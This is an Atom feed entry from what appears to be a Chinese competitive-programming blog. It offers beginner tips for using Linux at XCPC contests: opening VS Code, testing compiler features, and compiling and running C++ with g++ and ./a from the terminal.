    <content type="html"><![CDATA[<p>有一队在XCPC热身赛上连Linux都不会用,是谁呢?好难猜啊…</p><h2 id="如何打开什么IDE">如何打开什么IDE</h2><p>桌面的开始菜单点 <code>terminal</code> (命令行终端)输入 <code>code</code> 能打开VScode,然后能编译使用C++.</p><h2 id="创建文件">创建文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ctrl+n</span><br></pre></td></tr></table></figure><h2 id="测试什么">测试什么?</h2><p>众所周知,VScode只是一个比较好看的文本编辑器,能编译不等于能调试.</p><ol><li>测试 <code>__int128</code> 能否支持.</li><li>测试 <code>for(auto i:vc)</code> C++11标准</li><li>测试 <code>cin&gt;&gt;a;</code> 能不能在VScode输入东西(某场东北赛VScode能编译运行但是不能输入…)</li></ol><h2 id="如果在VScode不能输入怎么办">如果在VScode不能输入怎么办?</h2><p>只能用命令行了…</p><h2 id="命令行编译运行">命令行编译运行</h2><p>桌面右键,选open terminal here,然后打开的终端默认就是 <code>/Desktop</code> 文件夹.</p><p>命令行编译(注意区分文件大小写):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++ a.cpp -o a</span><br></pre></td></tr></table></figure><p>命令行执行:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./a</span><br></pre></td></tr></table></figure><blockquote><p>多次编译可以用键盘上的方向键去执行上一条输入过的指令.</p></blockquote><blockquote><p>Linux下编译的可执行文件是没有拓展名的,就叫 <code>a</code> .</p></blockquote><h2 id="测试样例怎么复制粘贴">测试样例怎么复制粘贴?</h2><p>首先,通用的一般是 <code>Ctrl+C</code> 或者 <code>Ctrl+Shift+C</code> 复制.<br>粘贴可以使用下面命令:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Ctrl+V</span><br><span class="line">Ctrl+Shift+V</span><br><span class="line">鼠标中键(按一下滚轮)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;有一队在XCPC热身赛上连Linux都不会用,是谁呢?好难猜啊…&lt;/p&gt;
&lt;h2 id=&quot;如何打开什么IDE&quot;&gt;如何打开什么IDE&lt;/h2&gt;
&lt;p&gt;桌面的开始菜单点 &lt;code&gt;terminal&lt;/code&gt; (命令行终端)输入 &lt;code&gt;code&lt;/code&gt; 能打开V</summary>
      
    
    
    
    <category term="ACM" scheme="https://narafluorine.github.io/categories/ACM/"/>
    
    
    <category term="Linux" scheme="https://narafluorine.github.io/tags/Linux/"/>
    
    <category term="Debian" scheme="https://narafluorine.github.io/tags/Debian/"/>
    
  </entry>
  
</feed>
